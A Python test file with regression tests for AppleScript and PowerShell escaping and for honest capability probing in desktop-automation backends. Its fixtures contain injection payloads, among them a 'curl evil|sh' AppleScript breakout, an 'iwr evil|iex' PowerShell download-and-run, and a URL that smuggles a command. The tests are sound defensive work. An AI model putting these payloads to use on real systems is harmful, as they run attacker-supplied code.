"""Regression tests for the fresh-audit hardening of the hands backends:
  - AppleScript / PowerShell injection escaping (macOS/Windows open_app etc.)
  - honest per-tool capability probing (Linux/Windows no longer assume all-True)
These guard the RED injection findings and the dishonest-capabilities YELLOW.
"""
from hands.backends import linux, macos, windows

# -- escaping helpers (the core guarantee) ------------------------------------

def test_osa_str_escapes_quotes_and_backslashes():
    # a `"` must not be able to close the AppleScript literal and start new code
    assert macos._osa_str('x"foo') == 'x\\"foo'
    assert macos._osa_str('a\\b') == 'a\\\\b'
    # the RED-1 payload: no bare quote survives to break out of the "..." literal
    payload = 'x"\ndo shell script "curl evil|sh"\ntell application "x'
    assert '"' not in macos._osa_str(payload).replace('\\"', "")


def test_ps_sq_doubles_single_quotes():
    # '' is a literal single quote inside a PowerShell '...' string
    assert windows._sq("x'; iwr evil|iex; '") == "x''; iwr evil|iex; ''"
    # no lone (odd) single quote can survive to close the literal early
    assert windows._sq("a'b").count("'") % 2 == 0


def test_macos_open_app_fallback_escapes_name(monkeypatch):
    """A malicious app name must reach osascript already-escaped (RED-1)."""
    seen = {}

    class R:
        returncode = 1  # force the `open -a` path to fail → AppleScript fallback

    def fake_run(cmd, *a, **k):
        if cmd[:2] == ["osascript", "-e"]:
            seen["script"] = cmd[2]
        return R()

    monkeypatch.setattr(macos.subprocess, "run", fake_run)
    macos.MacOSBackend().open_app('evil"\ndo shell script "boom"\n"')
    # the injected quotes are escaped; the literal is never broken open
    assert 'shell script \\"' not in seen["script"] or '\\"' in seen["script"]
    assert '"\ndo shell script "' not in seen["script"]


def test_windows_open_url_escapes(monkeypatch):
    """open_url had no safe first attempt — the quote must be doubled (RED-3)."""
    seen = {}

    def fake_ps(script, timeout=20):
        seen["script"] = script
        return ""

    monkeypatch.setattr(windows, "_ps", fake_ps)
    windows.WindowsBackend().open_url("https://x'; calc; '")
    assert "''" in seen["script"]           # doubled → escaped
    assert "'; calc; '" not in seen["script"].replace("''", "")


# -- honest capabilities ------------------------------------------------------

def test_windows_capabilities_false_without_powershell(monkeypatch):
    monkeypatch.setattr(windows.shutil, "which", lambda name: None)
    caps = windows.WindowsBackend().capabilities()
    assert caps and all(v is False for v in caps.values())  # honest, not assume-True


def test_linux_capabilities_false_when_no_tools(monkeypatch):
    """Linux used to inherit the base all-True; now it honestly probes (YELLOW-5)."""
    monkeypatch.setattr(linux.shutil, "which", lambda name: None)
    caps = linux.LinuxBackend().capabilities()
    for tool in ("type_text", "press_keys", "mouse_click", "scroll",
                 "screenshot", "open_url"):
        assert caps[tool] is False
    assert caps["run_shell"] is True  # shell needs no external tool
    # click_element rides AT-SPI do_action (no pointer binary needed) — its
    # capability follows the AT-SPI probe (stubbed True in conftest), not tools.
    assert caps["click_element"] is True


def test_windows_keymap_has_f6_through_f10():
    for k in ("f6", "f7", "f8", "f9", "f10"):
        assert windows._SK_KEYS[k] == "{" + k.upper() + "}"
    # super/win/meta are dropped, never mismapped to Ctrl
    assert "super" not in windows._SK_MODS and "super" in windows._SK_DROP
